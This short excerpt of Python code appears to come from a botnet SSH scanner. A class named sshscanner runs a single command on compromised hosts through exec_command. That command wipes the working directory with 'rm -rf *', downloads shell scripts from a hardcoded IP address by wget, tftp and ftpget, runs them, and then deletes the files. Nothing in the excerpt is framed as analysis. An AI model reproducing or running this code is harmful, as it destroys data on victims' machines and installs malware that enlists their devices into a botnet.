...
class sshscanner(threading.Thread):
    ...
    def run(self):
        while 1:
			...
			ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://138.197.75.217/OhhMotoGotMips.sh; chmod 777 OhhMotoGotMips.sh; sh OhhMotoGotMips.sh;  tftp 138.197.75.217 -c get OhhMotoGotTFTP1.sh; chmod 777 OhhMotoGotTFTP1.sh; sh OhhMotoGotTFTP1.sh; tftp -r OhhMotoGotTFTP2.sh -g 138.197.75.217; chmod 777 OhhMotoGotTFTP2.sh; sh OhhMotoGotTFTP2.sh; ftpget -v -u anonymous -p anonymous -P 21 138.197.75.217 OhhMotoGotTFTP1.sh OhhMotoGotTFTP1; sh OhhMotoGotTFTP1; rm -rf OhhMotoGotMips.sh OhhMotoGotTFTP1.sh OhhMotoGotTFTP2.sh ftp1.sh; rm -rf *")
